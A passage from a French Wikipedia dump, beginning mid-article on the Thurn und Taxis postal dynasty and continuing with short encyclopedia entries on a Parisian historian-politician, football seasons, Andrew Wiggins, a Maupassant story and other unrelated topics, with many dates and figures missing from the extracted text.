À partir du , elle exploite un relais de cavaliers et plus tard également un service de transport entre de nombreuses capitales européennes à partir duquel se développe à partir de 1600 environ la Poste impériale (Reichspost). À partir de 1615, les chefs de famille sont « maîtres de poste héréditaires » de l'Empire. Le lieu d'affaires déménage de la Lombardie via Bruxelles à Francfort-sur-le-Main en 1701. Après la fin du Saint Empire romain germanique en 1806, l'entreprise continue à être gérée de manière privée jusqu'à la seconde moitié du .
La famille, élevée au rang de baron en 1608 et comtale en 1624, ajoute "Thurn" à son nom de famille actuel "Taxis" à partir de 1650. En 1681, Eugène Alexandre de Tour et Taxis, de la lignée bruxelloise, est élevé au rang de prince hispano-néerlandais avec Braine-le-Château comme principauté titulaire (Principauté de la Tour et Tassis), et en 1695 au rang de prince du Saint-Empire "(« Fürst »)". L'admission au "Conseil impérial des princes" de la Diète d'Empire eut lieu en 1704. À partir de 1741, la maison Thurn et Taxis a fourni le commissaire principal (représentant de l'empereur et président du parlement) au « Reichstag perpétuel » (la Diète d'Empire), c'est pourquoi la famille a déménagé de Francfort à Ratisbonne, où elle a reçu les bâtiments et les terres de l'abbaye Saint-Emmeran, un ancien monastère impérial, en 1812, qui a depuis été leur résidence jusqu'à aujourd'hui.
La famille avait acquis un certain nombre d'abbayes impériales sécularisés en Haute Souabe pour compenser la perte de leurs revenus des routes postales sur la rive gauche du Rhin quand cette région est devenue française. Les cinq monastères avec de nombreux domaines subsidiaires (abbayes de Buchau, Marchtal, Neresheim, couvents dominicains d'Ennetach et de Siessen à Bad Saulgau, domaines d'Ostrach et de Schemmerberg de l'abbaye de Salem) sont réunis en une seule « principauté impériale de Buchau », en février 1803 par le recès d'Empire. La principauté avait une superficie totale de et environ , donc en taille un peu plus grand que l'Andorre. Au Conseil impérial des princes de la Diète d'Empire, il avait un vote viril. Avec la dissolution du Reichstag et la médiatisation de leur principauté au royaume de Wurtemberg en 1806, les princes ont conservé leur statut, leur égalité avec les maisons souveraines restantes et certains droits politiques spéciaux en leur qualité de "« Standesherren »" (« seigneurs de rang »), créés par l' Acte confédéral allemand.
Cependant, la famille a pu conserver la plupart des seigneuries de leur ancienne principauté en tant que propriété privée. En investissant ses revenus de l'activité postale - plus tard également les règlements des droits postaux - dans de nombreux seigneuries, outre les monastères mentionnés, la famille a pu acquérir une quarantaine d'autres domaines avec leurs châteaux tout au long du , principalement en Bavière ou en Souabe, mais une douzaine d'entre eux se trouvaient en Bohême. Ainsi la famille est devenue le plus grand propriétaire forestier privé d'Allemagne. Par conséquent, la famille est également connue aujourd'hui comme propriétaire de forêts, de brasseries, de banque et pour ses nombreux grands châteaux. Une chapelle sépulcrale à leur nom se trouve dans l'église Notre-Dame du Sablon à Bruxelles, où leur palais se tenait autrefois à côté.
Patronymie.
"Tasso" signifie blaireau en italien ("tassi" au pluriel), mais l'origine du nom proviendrait du mont Tasso sur lequel poussaient des ifs ("tassi" en italien) et où était bâti le château fort de la famille. Tasso se décline en "Tassi" car dans la langue italienne, ce pluriel indique la filiation au sens large du terme.
Le nom qui a pris un pluriel en italien est francisé, en lui ajoutant un -s devenant ainsi "Tassis". Puis, en 1512, une fois anoblie par l'empereur , l'orthographe du nom de cette famille se germanisera et s'écrira désormais "Taxis", car le -"ss" italien est remplacé en allemand comme en français par un -"x" avec la particule "von" utilisée dans les pays germaniques et "de" en France.
Au , le comte Lamoral III de Tassis revendique à tort une filiation avec la famille italienne "della Torre", qui a gouverné Milan au Moyen Âge, et prend pour nom : de La Tour et Tassis (en allemand "von Thurn und Taxis") ; une tour figure désormais sur le blason familial.
Activités de maître des postes.
Les Tassis sont connus pour avoir, dès le , avec Omedeo Tasso, organisé le transport de correspondances. Au , Ruggero de Tassis a fondé un service postal en Lombardie. À Innsbruck, le , son petit-fils Jeannetto de Tassis est nommé grand maître des postes. Avec sa parenté, il commence l'établissement d'une poste internationale qui va fortement se développer grâce au travail de son frère François de Taxis, basé à Malines puis à Bruxelles. Il s'est avéré être un organisateur ingénieux de la grande entreprise en pleine croissance. En temps de guerre, il savait adapter rapidement les routes interrompues, si nécessaire par bateau. L'empereur Charles Quint nomme Jean Baptiste de Taxis, maître général des postes en 1520.
Les routes postales les plus importantes étaient d'abord Venise-Rome, puis Venise-Vienne (par ordre de la république de Venise), Vienne-Bruxelles-Madrid (puis les capitales des différentes lignées de la maison de Habsbourg sur leur commande), et enfin presque toutes les grandes villes européennes. La famille a reçu des revenus tout compris de la cour espagnole des Habsbourg pour le transport du courrier entre les gouvernements et a organisé les itinéraires de manière indépendante. En transportant (initialement illégalement) des lettres et des colis de tiers avec les relais de la cavalerie impériale, la famille a rapidement pu multiplier ses revenus.
À l'occasion du de l'Union postale universelle à Bruxelles en 1952, les portraits des grands maîtres des postes de la famille de Tour et Tassis sont gravés sur les timbres belges COB 880 à 890 :
Le célèbre 40 F + 10 F (COB 891) représente le château de Beaulieu (situé à Machelen dans le Brabant flamand, en Belgique).
À Bruxelles, une plaque en bronze commémore la création du service postal Thurn und Taxis, sur la façade du Conservatoire royal, rue de la Régence.
La famille conserve le monopole postal du service international pendant des siècles, tissant un important réseau d'influence. Elle crée également d'autres entreprises, essentiellement en Allemagne (forestière, industrielle et bancaire).
Autres entreprises.
Après la mort du prince Johannes en 1990, sa veuve Gloria a dû consolider les finances de la famille, qui étaient mises à rude épreuve par des milliards de prêts pour des acquisitions d'entreprises, notamment aux États-Unis, qu'un groupe de gestionnaires de portefeuille, mal encadré par son mari de plus en plus malade, avaient acquis. À cette fin, elle a vendu de nombreuses participations de sociétés allemandes et étrangères, y compris la célèbre brasserie et la banque privée. La brasserie familiale a été vendue au groupe Paulaner (Munich) en 1996, mais produit toujours de la bière de haute qualité sous la marque "Thurn und Taxis".
Des dizaines de propriétés historiques ont également été vendues, ainsi que certains des trésors d'art lors d'une grande vente aux enchères. Beaucoup de pièces importantes appartiennent maintenant à l'État, mais se trouvent toujours au musée du château de Ratisbonne, ainsi que la très importante bibliothèque, qui comprend également des parties de la bibliothèque historique du monastère. De cette manière, elle peut enfin s'assurer que la plupart des propriétés agricoles et forestières de la famille restent en leur possession. On estime qu'environ appartiennent encore aujourd'hui à la famille.
La princesse, qui apparaît également fréquemment dans la presse, gère toujours les vastes affaires de la maison, dont son fils Albert II de Tour et Taxis est le chef actuel depuis 1990.
Châteaux.
La famille de Tour et Taxis occupe le château Saint-Emmeran, à Ratisbonne, depuis 1748. Elle l'utilise comme résidence principale depuis la transformation des bâtiments monastiques de l'abbaye Saint-Emmeran en château de résidence par Jean-Baptiste Métivier en 1812. Le château, également appelé château de Tour et Taxis, est la plus grande résidence non palatiale d'Allemagne, avec 517 chambres, une superficie immobilière de et un parc, situé dans le centre-ville de Ratisbonne, s'étendant sur cinq hectares.
La famille possède toujours les châteaux de Taxis à Trugenhofen (Dischingen) et de Garatshausen à Tutzing sur le lac de Starnberg (de l'héritage d'Hélène en Bavière). Elle vendit plusieurs dizaines de ses châteaux au cours du , mais conserva souvent la propriété agricole et forestière.
Leur palais municipal bruxellois, qui faisait face à l'église Notre-Dame du Sablon, fut démoli en 1872 pour faire place à la rue de la Régence, axe visuel du Palais de justice. La famille Taxis avait sa résidence de campagne au château voisin de Buizingen et, dès 1652 au château de Beaulieu et à partir de 1670 à Braine-le-Château.
L'ancien hôtel de la famille à Francfort, le palais de Tour et Taxis, construit à partir de 1731, abritait le siège du Bundestag de 1815 à 1866. Vendu en 1895, il fut détruit pendant la Seconde Guerre mondiale et reconstruit à partir de 2004.
Filiation.
Plusieurs membres de la famille ont été chevaliers de Malte.
Le chef actuel de la maison de Tour et Taxis est Albert II, de Tour et Taxis, fils du prince Johannes et de son épouse, Gloria von Schönburg-Glauchau.
Barons de Tour et Taxis.
En 1608, le chef de famille est élevé au titre de baron.
Comtes de Tour et Taxis.
En 1624, le chef de famille est élevé au titre de comte.
Princes de Tour et Taxis, de 1695 à nos jours.
Eugène Alexandre est élevé au titre de prince du Saint-Empire "(« Fürst »)" en 1695 par l'empereur Léopold Ier.

</doc>

<doc id="7276603" url="https://fr.wikipedia.org/wiki?curid=7276603" title="Eugène de Ménorval">
Eugène de Ménorval

Eugène de Ménorval (de son vrai nom, Eugène de La Goublaye de Ménorval) né à Paris le et mort dans cette même ville le , est un historien et homme politique français du .
Biographie.
Eugène de Lagoublaye de Ménorval, fils aîné d'Adélaïde Corneille Saint-Marc et du capitaine de cavalerie Eugène-Jean-Laurent de La Goublaye de Ménorval (1790-1860), est le descendant d'une branche cadette de la maison de La Goublaye, une famille aristocratique bretonne attestée depuis le . Cependant, en tant que républicain, il n'arborera jamais de titre nobiliaire et signe ses publications et sa correspondance « E. de Ménorval ».
Après avoir étudié dans un collège de province, Eugène de Ménorval devient professeur au collège de Dreux après 1848 et prépare l'agrégation au moment où survient le coup d’État du 2 décembre 1851. Ayant protesté publiquement, tout comme son ami Adolphe Royannez, contre ce coup de force (en arrachant les affiches contenant la proclamation de Louis-Napoléon Bonaparte), Eugène doit renoncer à son poste et à toute carrière universitaire. Il revient alors à Paris et se fixe dans l'actuel , où, après avoir été maître répétiteur à l'institution Jauffret (alors installée dans l'hôtel Le Peletier de Saint-Fargeau), il fonde en 1859 sa propre institution privée (située dans l'ancien hôtel de Lyonne, entre le 16 de la rue des Lions-Saint-Paul et le 14 de la rue Beautreillis) destinée aux élèves du Lycée Charlemagne. La même année, il épouse une cousine, Clarisse Corneille Saint-Marc, qui lui donnera trois enfants, Eugène (1864-19??), artiste-peintre, Marguerite et Hélène. Partisan de la démocratisation de l'enseignement, officier de l'Instruction publique, Eugène de Ménorval est vice-président de l'Association polytechnique fondée en 1830 par Auguste Comte.
Activités politiques.
L'engagement politique d'Eugène de Ménorval le place tout d'abord à la gauche du mouvement républicain. Il participe ainsi à la campagne de Désiré Barodet en 1873. Nommé premier adjoint au maire du en 1879, il est élu conseiller municipal de Paris pour le quartier de l'Arsenal le . Réélu le (contre le républicain modéré Émile Kern) et le , siégeant parmi les indépendants puis parmi les autonomistes, il devient également conseiller général de la Seine. À cette époque, Eugène de Ménorval est un radical autonomiste et anticlérical, partisan de l'autonomie communale de la capitale, de la suppression du Sénat, de la séparation de l’Église et de l’État, et de la laïcisation de l’École. Il figure ainsi sur la liste de la Fédération républicaine radicale (menée par des leaders de l'extrême gauche et de la gauche radicale tels que Floquet, Lockroy, Brisson, Allain Targé, Clemenceau, De La Forge et Barodet) lors des élections législatives de 1885. Il se définira plus tard comme un « Républicain socialiste » tout en se distinguant nettement des internationalistes en tant qu'« ardent patriote ».
À l'instar de nombreux radicaux partisans d'une révision constitutionnelle que leur refuse la majorité parlementaire républicaine opportuniste, il adhère au boulangisme, en participant, en , à la fondation de la « Ligue d'action républicaine » de Georges Laguerre puis en appartenant au Comité républicain national, véritable état-major du mouvement. Outre le révisionnisme, c'est également le nationalisme qui l'attire dans le sillage du « général Revanche » : repreneur de l'hebdomadaire "L'Antiprussien" (renommé "La Défense nationale" depuis ), membre de la Ligue des patriotes de Paul Déroulède, dont il intègre le comité directeur, il essaiera de surmonter la dissolution de ce groupe en appelant en 1891 à la formation d'une « Ligue anti-allemande », en réaction à l'arrestation de nationalistes qui avaient manifesté contre la représentation du "Lohengrin" de Wagner à l'Opéra. Après la mort du général Boulanger, il participera avec d'autres boulangistes de gauche (tels que Laisant, Planteau et Roche) à la création d'une « Ligue intransigeante socialiste » présidée par Henri Rochefort.
Sa participation active au mouvement boulangiste l'expose à la violence des luttes politiques de l'époque : en 1888, une de ses réunions publiques dégénère en bagarre ponctuée de coups de feu et, à la suite d'une altercation au conseil municipal, il affronte en duel son collègue Émile Chautemps.
Candidat boulangiste dans la première circonscription du (correspondant aux quartiers de l'Arsenal et Saint-Gervais) lors des élections législatives de 1889, il talonne Barodet au premier tour avant d'être battu par son ancien colistier à l'issue d'une campagne diffamatoire. À la suite de cette défaite, il démissionne le de son mandat municipal puis tente de reconquérir son siège lors des élections municipales des 27 avril et 4 mai 1890 : largement en tête au premier tour, Eugène de Ménorval est cependant battu au second tour par le modéré Pierre-Nicolas Hervieu, candidat de l'Union libérale qui a bénéficié de la discipline républicaine appliquée par les anti-boulangistes. Lors des législatives de 1893, il est à nouveau candidat (en tant que « révisionniste plébiscitaire ») contre Barodet, qui le devance largement dès le premier tour. En , une élection législative partielle dans le (provoquée par la démission d'Abel Hovelacque) lui offre une nouvelle occasion, cette fois-ci en tant que socialiste révisionniste. Or, le meneur de cette tendance, Henri Rochefort, tout d'abord favorable à l'ex-conseiller municipal, se concerte avec Jean Jaurès et choisit finalement de soutenir un autre socialiste, Gérault-Richard. Eugène de Ménorval maintient cependant sa candidature mais celle-ci n'ayant recueilli qu'un faible nombre de suffrages au premier tour, il se désiste en faveur de Gérault-Richard. Il tente une dernière fois de reprendre son siège de conseiller municipal en 1896. Patronné par les blanquistes du comité socialiste révolutionnaire, il n'obtient que 542 voix mais parvient à mettre Hervieu en ballotage face au radical Vaudet.
Travaux historiques.
Passionné d'histoire dès son plus jeune âge, Eugène de Ménorval est marqué par sa rencontre, en 1840, avec le célèbre historien Augustin Thierry, époux d'une cousine d'Eugène, Julie de Querengal, et par la lecture des œuvres de Chateaubriand.
Membre puis vice-président de la Société des amis des monuments parisiens, membre de différentes commissions relatives à l'histoire de la capitale, il met à profit son mandat municipal pour plaider en faveur du patrimoine et de la connaissance du vieux Paris, notamment en demandant la conservation des arènes de Lutèce (1883) et en obtenant les fonds nécessaires à la continuation du plan archéologique de Paris entrepris par Albert Lenoir et Adolphe Berty (1887). Passionné par l'histoire de sa ville natale, il publie des études érudites sur le passé de son quartier, écrit des articles pour "Le Figaro" puis pour "L’Éclair" et contribue à "L'Intermédiaire des chercheurs et curieux". Son œuvre maîtresse, une histoire de Paris des origines jusqu'en 1789, reste inachevée, le quatrième volume, consacré au , n'ayant jamais été publié.
Il meurt le en son domicile du n 20 la rue du Petit-Musc. Il est tout d'abord inhumé au cimetière de Bagneux avant d'être transféré, deux mois plus tard, au Père-Lachaise (division 92), une concession perpétuelle ayant été accordée gratuitement par la ville de Paris.

</doc>
<doc id="7276604" url="https://fr.wikipedia.org/wiki?curid=7276604" title="Championnat de Macédoine de football 2013-2014">
Championnat de Macédoine de football 2013-2014

La saison 2013-2014 du championnat de Macédoine de football est la de la première division macédonienne. Lors de celle-ci, le FK Vardar Skopje tente de conserver son titre de champion face aux onze meilleurs clubs macédoniens lors d'une série de matchs se déroulant sur toute l'année. Les douze clubs participants à la première phase de championnat affrontent à deux reprises les onze autres. En fonction du classement établi au terme de cette première phase, chaque équipe affronte une fois de plus les onze autres afin d'attribuer le titre de champion. En fin de saison, pour permettre le passage du championnat de douze à dix clubs, les quatre derniers du classement sont relégués et remplacés par les deux meilleures formations de deuxième division.
C'est le FK Rabotnički Skopje qui remporte le championnat cette saison après avoir terminé en tête du classement final, avec deux points d'avance sur le FK Horizont Turnovo et trois sur le FK Metalurg Skopje. C'est le quatrième titre de champion de Macédoine de l'histoire du club.
Compétition.
Classement.
Le classement est établi sur le barème de points classique (victoire à 3 points, match nul à 1, défaite à 0).
Pour départager les égalités, on tient d'abord compte de la différence de buts générale, puis du nombre de buts marqués, puis des confrontations directes et enfin si la qualification ou la relégation est en jeu, les deux équipes jouent une rencontre d'appui sur terrain neutre.

</doc>
<doc id="7276605" url="https://fr.wikipedia.org/wiki?curid=7276605" title="Dutor">
Dutor



</doc>
<doc id="7276606" url="https://fr.wikipedia.org/wiki?curid=7276606" title="La Confidence (Maupassant)">
La Confidence (Maupassant)

La Confidence est une nouvelle de Guy de Maupassant, parue en 1885.
Historique.
"La Confidence" est une nouvelle écrite par Guy de Maupassant et publiée initialement dans le quotidien "Gil Blas" du , avant d'être reprise dans le recueil "Monsieur Parent".
Résumé.
La petite marquise de Rennedon raconte à son amie, la petite baronne de Grangerie, comment elle vient de se venger de son abominable mari...Elle arrive chez Boviniac, dont le mari est jaloux de lui. Et lui racontant comment son mari l'avait battue, Beauvigon l'embrassa et l'apaisa. L'histoire se termine lorsque les deux amis rient et que le mari de marquise arrive chez lui.

</doc>
<doc id="7276612" url="https://fr.wikipedia.org/wiki?curid=7276612" title="Alix de Brabant">
Alix de Brabant

Alix de Brabant, née vers 1285 et morte en 1315, fille de Godefroy d'Aerschot, petite-fille du duc de Brabant , nièce de la reine Marie, épouse du roi de France , devient en 1302 l'épouse de , un puissant seigneur du duché de Normandie.
Biographie.
Origines familiales et formation.
Son père, Godefroy d'Aerschot (?-1302), est le fils d' (1231-1261) et d'Adélaïde de Bourgogne (1233-1273).
Sa mère est Jeanne Isabeau de Vierzon, qui a épousé Godefroy en 1277. 
Elle est le quatrième enfant de la fratrie, l'aîné, Jean, étant né en 1281.
Héritière de la Maison de Vierzon, Alix porte le titre de dame de Mézières-en-Brenne et tient le château de La Ferté-Imbault (actuel Loir-et-Cher, en Sologne), qu'elle apporte en dot à son époux.
Mariage et descendance.
Elle épouse en 1302 (?-1329), seigneur d'Harcourt, mais aussi vicomte de Châtellerault, baron d'Elbeuf.
De ce mariage naissent :
Morte en 1315, elle est inhumée en Touraine, dans la collégiale Sainte-Marie-Madeleine du château de Mézières qu'elle a fondée en 1333.

</doc>
<doc id="7276615" url="https://fr.wikipedia.org/wiki?curid=7276615" title="Zandarmerija">
Zandarmerija



</doc>
<doc id="7276617" url="https://fr.wikipedia.org/wiki?curid=7276617" title="Andrew Wiggins">
Andrew Wiggins

Andrew Christian Wiggins, né le à Toronto au Canada, est un joueur canadien de basket-ball évoluant au poste d'ailier pour le Heat de Miami.
Élu meilleur lycéen de l'année tous sports confondus en 2013, il est la meilleure recrue universitaire de 2013. Non éligible pour la draft 2013 de la NBA, il est choisi par les Cavaliers de Cleveland en première position lors de la draft 2014 de la NBA, et envoyé dans un échange contre Kevin Love aux Timberwolves du Minnesota. 
À l'issue de sa première saison en NBA, il est élu Rookie of the Year.
Biographie.
Jeunesse.
Wiggins est né à Toronto, Ontario, et a grandi tout près de Thornhill. Il est le fils d'un ancien joueur NBA, Mitchell Wiggins, et d'une ancienne sprinter canadienne, Marita Payne. À 13 ans, il attire déjà l'attention pour ses capacités de basketteur.
Carrière lycéenne.
Wiggins fréquente le collège d'enseignement général de Vaughan pendant deux ans avant d'être transféré à l'école préparatoire d'Huntington en Virginie-Occidentale en 2011.
En , il est invité au Nike Hoop Summit 2012 se déroulant à Portland le . Ce match réunit les étoiles montantes du basket-ball mondial et oppose une équipe de jeunes américains à une sélection de joueurs du reste du monde. Lors de cette rencontre, remportée par la sélection mondiale sur le score de 84 à 75, Wiggins inscrit 20 points à 7 sur 18 au tir et capte 7 rebonds en 33 minutes de jeu.
Wiggins est considéré comme le meilleur espoir du basket-ball parmi les lycéens obtenant leur diplôme en 2014, mais annonce en qu'il sera reclassé dans la classe lycéenne de 2013, et est immédiatement placé devant le précédent numéro un, Jabari Parker, par ESPN.
En , Wiggins est sélectionné pour participer au Nike Hoop Summit qui a lieu le à Portland. Lors de ce match, remporté par la sélection mondiale 112-98, il est titulaire et termine avec 17 points, 9 rebonds et 4 passes décisives.
Wiggins est nommé Naismith Prep Player of the Year de l'année 2013 le . Il est également nommé Gatorade National Player of the Year de l'année 2013 le , titre désignant le meilleur joueur national de lycée. En , il est nommé .
Carrière universitaire.
Wiggins s'engage avec l'équipe masculine de basket-ball des Jayhawks du Kansas le . Avant l'annonce finale, il avait réduit ses choix aux Gators de Floride, aux Wildcats du Kentucky, aux Tar Heels de la Caroline du Nord et aux Jayhawks.
Carrière professionnelle.
Timberwolves du Minnesota (2014-2020).
Il est sélectionné en première position de la Draft 2014 de la NBA par les Cavaliers de Cleveland, le .
En , Wiggins fait partie d'un échange entre les Cavs, les 76ers de Philadelphie et les Timberwolves du Minnesota. Wiggins rejoint les Timberwolves avec Anthony Bennett et Thaddeus Young tandis que Kevin Love arrive à Cleveland et Luc Mbah a Moute et Alexey Shved arrivent à Philadelphie.
En , il est élu Rookie of the Year.
Il fait partie des joueurs les plus prometteurs de sa génération, malgré des problèmes récurrents en défense. Avec l'arrivée de Jimmy Butler aux Timberwolves à l'été 2017, Wiggins devient la troisième option offensive de l'équipe. Butler critique le manque d'implication en défense de Karl-Anthony Towns et de Wiggins, créant des tensions dans l'équipe.
Avec une qualification obtenue au dernier match de la saison 2017-2018, Andrew Wiggins dispute son premier match de playoffs contre les Rockets de Houston le . Les Timberwolves perdent la série 4-1.
Warriors de Golden State (2020-2025).
Le 6 février 2020, il est envoyé aux Warriors de Golden State en échange de D'Angelo Russell, Jacob Evans et Omari Spellman.
Au début de la pandémie de Covid-19, Wiggins refuse de se faire vacciner. Or la ville de San Francisco, où les Warriors jouent (au Chase Center) et s'entraînent, décide d'interdire, à partir d', aux personnes non-vaccinées de rentrer dans une grande salle sur le territoire de la ville. Wiggins risque de perdre 9 millions de dollars s'il ne joue pas les matches à domicile et accepte donc de se faire vacciner avant le début de la saison.
Les Warriors et Wiggins remportent le titre à l'issue de la saison 2021-2022. Wiggins réalise des bonnes finales derrière la star de l'équipe, Stephen Curry.
En octobre 2022, Wiggins signe une extension de contrat de 109 millions de dollars sur quatre ans.
Heat de Miami (depuis 2025).
En février 2025, il est transféré en direction du Heat de Miami dans un échange à cinq équipes.
International.
Wiggins participe au championnat du monde des moins de 17 ans en 2010 et au championnat des Amériques des 18 ans et moins en 2012. Il aide le Canada à remporter la médaille de bronze dans chacun de ces tournois. Lors du championnat de 2010, Wiggins est le coéquipier d'Anthony Bennett, le choix numéro un de la Draft 2013 de la NBA.
Statistiques.
Universitaires.
Les statistiques d'Andrew Wiggins en matchs universitaires sont les suivantes :
Professionnelles.
gras = ses meilleures performances
Saison régulière.
Les statistiques d'Andrew Wiggins en saison régulière de NBA sont les suivantes :
Records sur une rencontre en NBA.
Les records personnels d'Andrew Wiggins en NBA sont les suivants :
"Dernière mise à jour : "
Salaires.
Les gains d'Andrew Wiggins en NBA sont les suivants :
Vie personnelle.
Un de ses frères aînés, , est un joueur professionnel de basket-ball ayant joué en 2014 aux Walter Tigers Tübingen ; tandis que son autre frère aîné, Mitchell Junior, a joué au basket-ball à l'université du Sud-Est.

</doc>
<doc id="7276627" url="https://fr.wikipedia.org/wiki?curid=7276627" title="Championnat d'Albanie de football 2013-2014">
Championnat d'Albanie de football 2013-2014

La saison 2013-2014 de Kategoria Superiore (ou "Super Ligue Albanaise") est la soixante-quinzième édition du championnat d'Albanie de football et la seizième saison sous son nom actuel.
La saison débute le et se termine le . Les douze meilleures équipes du pays sont regroupées au sein d'une poule unique où elles s'affrontent toutes deux fois au cours de la saison. À la fin du championnat les quatre derniers du classement sont relégués et remplacés par les quatre meilleurs clubs de Kategoria e parë. Triple champion sortant, Skënderbeu Korçë tente de défendre son titre contre les onze autres équipes dont les promus KS Lushnja et Partizan Tirana. En fin de saison, pour faire passer le championnat de 12 à 10 formations, les quatre derniers du classement sont relégués et remplacés par les deux meilleurs clubs de "Kategoria e paë", la deuxième division albanaise.
C'est le KF Skënderbeu Korçë, tenant du titre, qui remporte à nouveau la compétition cette saison après avoir terminé en tête du classement final, avec quatre points d'avance sur le FK Kukësi et sept sur le duo KF Laçi-KS Teuta Durrës. Il s'agit du cinquième titre de champion d'Albanie de l'histoire du club, le quatrième consécutif.
Compétition.
Classement.
Le classement est établi sur le barème de points classique (victoire à 3 points, match nul à 1, défaite à 0). Pour départager les égalités, on tient d'abord compte de la différence de buts générale, puis du nombre de buts marqués, puis des confrontations directes et enfin si la qualification ou la relégation est en jeu, les deux équipes jouent une rencontre d'appui sur terrain neutre.

</doc>
<doc id="7276636" url="https://fr.wikipedia.org/wiki?curid=7276636" title="Saison 1999-2000 du Paris Saint-Germain">
Saison 1999-2000 du Paris Saint-Germain

La saison 1999-2000 du Paris Saint-Germain est la trentième saison de l'histoire du club. Le PSG participe alors au championnat de Ligue 1, à la Coupe de France, à la Coupe de la Ligue.

</doc>
<doc id="7276643" url="https://fr.wikipedia.org/wiki?curid=7276643" title="Royal Berkshire Hospital">
Royal Berkshire Hospital

Le Royal Berkshire Hospital est un hôpital du National Health Service situé à Reading, dans le comté du Berkshire en Angleterre.
L'hôpital dispose de plus de d'hospitalisation et emploie plus de pour un budget annuel de 228 millions de livres sterling.
Histoire.
L'hôpital a été fondé en 1839 sur des terres données par Henry Addington, un homme d'État britannique qui fut Premier ministre.
L'aviateur Douglas Bader a eu ses deux jambes amputées dans cet hôpital en 1931 après un accident à Woodley.
L'hôpital apparaît dans le film "Vainqueur du ciel" (1956).
Le principal bâtiment et ses deux ailes sont classés « grade II » par l'English Heritage.

</doc>
<doc id="7276646" url="https://fr.wikipedia.org/wiki?curid=7276646" title="Aéroport de Charlevoix">
Aéroport de Charlevoix

L'aéroport de Charlevoix (AITA : YML, OACI : CYML) est un aéroport situé à Saint-Irénée au Québec, desservant aussi la région de Charlevoix. Il se trouve à 8,1 kilomètres au sud-sud-ouest de La Malbaie. Il est inauguré en 1962.
Chaque année, de mai à novembre, 4 000 personnes y transitent.

</doc>
<doc id="7276649" url="https://fr.wikipedia.org/wiki?curid=7276649" title="À la dure">
À la dure

À la dure est une expression qui signifie "de manière sévère", "difficile",
À la dure peut faire référence à :

</doc>
<doc id="7276654" url="https://fr.wikipedia.org/wiki?curid=7276654" title="Fifty Million Frenchmen (comédie musicale)">
Fifty Million Frenchmen (comédie musicale)

 « » est une comédie musicale américaine en deux actes sur un livret d'Herbert Fields, paroles et musique de Cole Porter. L'œuvre, créée en 1929 a été jouée 254 fois à Broadway puis a été adaptée au cinéma en 1931 ("Fifty Million Frenchmen") et en 1934 avec Bob Hope ("").
Argument.
À Paris en juin 1929, trois jeunes amis de condition aisée installés au bar de l'hôtel Ritz font un pari : Peter doit séduire Looloo, une jeune femme inconnue installée au bar, puis annoncer son mariage avec elle dans un délai d'un mois. Mais une condition est posée : Peter, qui est fortuné, doit faire croire à la belle qu'il est de condition modeste et donc doit travailler et ne vivre que sur son seul salaire, ce qui démontrera qu'elle l'épouse par amour.

</doc>
<doc id="7276655" url="https://fr.wikipedia.org/wiki?curid=7276655" title="La Steppe (film, 1962)">
La Steppe (film, 1962)



</doc>
<doc id="7276658" url="https://fr.wikipedia.org/wiki?curid=7276658" title="Les Sept Barres d'or">
Les Sept Barres d'or

Les Sept Barres d'or est un film muet de Georges Méliès sorti en 1910.

</doc>
<doc id="7276660" url="https://fr.wikipedia.org/wiki?curid=7276660" title="Aéroport de Port-Menier">
Aéroport de Port-Menier

L'aéroport de Port-Menier est un aéroport situé à environ 5 kilomètres à l'est de Port-Menier, sur l'île d'Anticosti, au Québec.

</doc>
<doc id="7276661" url="https://fr.wikipedia.org/wiki?curid=7276661" title="Championnat du pays de Galles de football 2013-2014">
Championnat du pays de Galles de football 2013-2014

La saison 2013-2014 de la Welsh Premier League est la de la première division galloise. Les douze meilleures équipes s'affrontent au sein d'une poule unique où elles se rencontrent deux fois. À l'issue de cette première phase, les six premiers jouent la poule pour le titre tandis que les six derniers doivent disputer la poule de relégation.
C'est le tenant du titre, The New Saints, qui remporte à nouveau la compétition cette saison après avoir terminé en tête du classement final, avec quatorze points d'avance sur Airbus UK Broughton. C'est le huitième titre de champion du pays de Galles de l'histoire du club, qui réussit même le doublé en s'imposant en finale de la Coupe du pays de Galles face à Aberystwyth Town.
Compétition.
Playoffs.
Les équipes classées entre la et la disputent les play-offs pour déterminer la troisième équipe galloise qualifiée en Ligue Europa 2014-2015.

</doc>
<doc id="7276664" url="https://fr.wikipedia.org/wiki?curid=7276664" title="Échecs à l'Universiade d'été de 2013">
Échecs à l'Universiade d'été de 2013

Les épreuves d'échecs de l'Universiade d'été de 2013 se déroulent à Kazan en Russie, du 9 au .
Faits marquants.
Le titre individuel masculin revient au Philippin Wesley So, qui bat en finale l'Arménien Zaven Andriasian. Chez les femmes, la Chinoise Zhao Xue remporte l'or, devant ses compatriotes Ju Wenjun et Tan Zhongyi. Par équipes, la Chine s'impose devant la Russie et la Pologne.

</doc>
<doc id="7276668" url="https://fr.wikipedia.org/wiki?curid=7276668" title="Trolleybus d'Edmonton">
Trolleybus d'Edmonton

Le réseau de trolleybus d'Edmonton est l'un des systèmes de transport en commun desservant la ville de Edmonton, au Canada, avant sa fermeture mi-2009.
Réseau.
Aperçu général.
Le Réseau, en 2008, est composé de 15 lignes desservant Edmonton et son agglomération: 2, 3, 4, 5, 7, 8, 9, 11, 12, 13, 14, 21, 22, 23, 24.
Matériel roulant.
Le parc en 2008 est composé de 101 rames:

</doc>
<doc id="7276669" url="https://fr.wikipedia.org/wiki?curid=7276669" title="Championnat d'Arménie de football 2013-2014">
Championnat d'Arménie de football 2013-2014

La saison 2013-2014 de Premier-Liga Arménienne est la du Championnat d'Arménie de football. Lors de cette saison, le Shirak FC tente de conserver son titre de champion d'Arménie. Trois places sont qualificatives pour les compétitions européennes, la quatrième place étant celles du vainqueur de la Coupe d'Arménie 2014. Il n'y a ni promotion, ni relégation à l'issue de la saison.
C'est le Banants Erevan qui remporte la compétition cette saison après avoir terminé en tête du classement final, avec trois points d'avance sur un duo composé du tenant du titre, Shirak FC et du Mika Erevan. C'est le tout premier titre de champion d'Arménie de l'histoire du club.

</doc>
<doc id="7276670" url="https://fr.wikipedia.org/wiki?curid=7276670" title="Frances Farrand Dodge">
Frances Farrand Dodge

Frances Farrand Dodge, née le à Lansing et morte le à Deep Water Point dans le Maryland, est une artiste américaine, aquarelliste, lithographe et enseignante.
Famille et études.
Elle est la fille de Ann E. Shank et de Hart Augustus Farrand. Frances étudie tout d'abord à la Central High School de Lansing, dans le Michigan, jusqu'en 1898, et ensuite à la Michigan State University. Joseph Pennell lui enseigne la technique de l'eau-forte à la Art Students League de New York. Elle épouse, en 1907, Arthur C. Dodge.
Carrière.
